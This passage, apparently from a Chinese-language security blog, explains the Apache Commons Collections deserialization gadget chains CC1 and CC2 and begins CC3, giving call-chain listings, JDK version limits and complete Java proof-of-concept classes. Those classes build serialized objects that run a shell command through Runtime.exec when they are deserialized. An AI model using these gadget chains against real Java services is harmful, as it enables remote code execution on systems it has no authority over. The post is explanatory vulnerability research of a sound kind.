<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//声明一个实现了InvocationHandler接口的类</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> Map map;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">(Map map)</span></span>&#123;</span><br><span class="line">                <span class="keyword">this</span>.map = map;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Calling invoke....&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Hook method: &quot;</span> + method.getName());</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Hacked return string&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.map,args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler = <span class="keyword">new</span> Demo(<span class="keyword">new</span> HashMap());</span><br><span class="line">        <span class="comment">//代理时传入实现了InvocationHandler接口的类的实例对象,返回代理对象proxyMap</span></span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">        <span class="comment">//当代理对象proxyMap调用任意方法时,都会被之前传入的实现了</span></span><br><span class="line">        <span class="comment">//InvocationHandler接口的类下重写的invoke方法给替换掉</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//比如这里的put和get都会被Demo.invoke给替换掉</span></span><br><span class="line">        proxyMap.put(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        String result = (String) proxyMap.get(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>那么就有希望调用到某个类的<code>invoke</code>函数了，这里的<code>CC1</code>即选取的尝试调用<code>AnnotationInvocationHandler.invoke()</code></p>

        <h2 id="JAVA源码版本-8u40"   >
          <a href="#JAVA源码版本-8u40" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803181047725.png" alt="image-20220803181047725"></p>
<p>细节如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制"   >
          <a href="#限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：<code>8u71</code>及以前版本，原因是在<code>8u71</code>之后的版本中<code>sun.reflect.annotation.AnnotationInvocationHandler.readObject()</code>函数发生了变化。</p>

        <h2 id="POC"   >
          <a href="#POC" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                   <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch aaaaa&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap) LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个与代理对象相关联的InvocationHandler map_handler</span></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建代理对象proxy_map来代理map_handler，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法</span></span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,map_handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//再创建一个AnnotationInvocationHandler对象，用来触发代理对象proxy_map的方法执行,从而跳转AnnotationInvocationHandler.voker()</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc1&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc1&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-2"   >
          <a href="#解析-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-2" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="AnnotationInvocationHandler-readObject"   >
          <a href="#AnnotationInvocationHandler-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#AnnotationInvocationHandler-readObject" class="headerlink" title="AnnotationInvocationHandler.readObject()"></a><code>AnnotationInvocationHandler.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803201921921.png" alt="image-20220803201921921"></p>

        <h3 id="AnnotationInvocationHandler-invoke"   >
          <a href="#AnnotationInvocationHandler-invoke" class="heading-link"><i class="fas fa-link"></i></a><a href="#AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler.invoke()"></a><code>AnnotationInvocationHandler.invoke()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803203105622.png" alt="image-20220803203105622"></p>

        <h3 id="LazyMap-get"   >
          <a href="#LazyMap-get" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>还是经典的链子<code>CIR</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>

        <h1 id="二、CC2"   >
          <a href="#二、CC2" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、CC2" class="headerlink" title="二、CC2"></a>二、CC2</h1>
      
        <h2 id="JAVA源码版本-8u40-1"   >
          <a href="#JAVA源码版本-8u40-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-1" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805162929023.png" alt="image-20220805162929023"></p>
<p>细节如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()-&gt;heapify()-&gt;siftDown()-&gt;siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Templateslmpl.newTransfomer()</span><br></pre></td></tr></table></div></figure>

<p><code>PriorityQueue</code>在<code>commons-collections4</code>下才开始有</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-1"   >
          <a href="#限制-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-1" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>

        <h2 id="POC-1"   >
          <a href="#POC-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构建字节码</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch aaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>)</span><br><span class="line">                .getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        setField(queue,<span class="string">&quot;queue&quot;</span>,queue_array);</span><br><span class="line">        setField(queue,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置comparator为TransformingComparator,进入siftDownUsingComparator</span></span><br><span class="line">        setField(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc2&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc2&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-3"   >
          <a href="#解析-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-3" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="PriorityQueue-readObject"   >
          <a href="#PriorityQueue-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue.readObject()"></a><code>PriorityQueue.readObject()</code></h3>
      <p>这里同理需要看一下<code>writeObject</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805165712958.png" alt="image-20220805165712958"></p>
<p>也是对应读写的，所以可以利用反射设置<code>PriorityQueue</code>的<code>queue</code>，使其可控，然后进入下面的<code>heapify()</code>函数</p>

        <h3 id="PriorityQueue-heapify"   >
          <a href="#PriorityQueue-heapify" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue.heapify()"></a><code>PriorityQueue.heapify()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170040301.png" alt="image-20220805170040301"></p>
<p>再进入<code>siftDown</code></p>

        <h3 id="PriorityQueue-siftDown"   >
          <a href="#PriorityQueue-siftDown" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue.siftDown()"></a><code>PriorityQueue.siftDown()</code></h3>
      <p>其中<code>comparator</code>利用反射设置为<code>TransformingComparator</code>，随后进入<code>siftDownUsingComparator</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170115164.png" alt="image-20220805170115164"></p>

        <h3 id="PriorityQueue-siftDownUsingComparator"   >
          <a href="#PriorityQueue-siftDownUsingComparator" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue.siftDownUsingComparator()"></a><code>PriorityQueue.siftDownUsingComparator()</code></h3>
      <p>调用到实现了<code>Comparator</code>接口的<code>TransformingComparator.comparator()</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170501655.png" alt="image-20220805170501655"></p>

        <h3 id="TransformingComparator-comparator"   >
          <a href="#TransformingComparator-comparator" class="heading-link"><i class="fas fa-link"></i></a><a href="#TransformingComparator-comparator" class="headerlink" title="TransformingComparator.comparator()"></a><code>TransformingComparator.comparator()</code></h3>
      <p>那么之前利用反射设置了<code>TransformingComparator.transformer</code>为<code>InvokerTransformer</code>，那么就可以调用到<code>InvokerTransformer.transoform</code>，并且其参数即为这里的<code>obj1</code>，也为<code>PriorityQueue.queue</code>，这个之前设置为了<code>TemplatesImpl</code>，即最后可调用到经典链子<code>ITN</code>，完成利用。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170750082.png" alt="image-20220805170750082"></p>

        <h1 id="三、CC3"   >
          <a href="#三、CC3" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、CC3" class="headerlink" title="三、CC3"></a>三、CC3</h1>
      
        <h2 id="JAVA源码版本-8u40-2"   >
          <a href="#JAVA源码版本-8u40-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-2" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110944484.png" alt="image-20220806110944484"></p>
<p>细节如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>

<p>之后的链子就是经典<code>CITTN</code>链了</p>

        <h2 id="限制-2"   >
          <a href="#限制-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-2" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>

        <h2 id="POC-2"   >
          <a href="#POC-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> 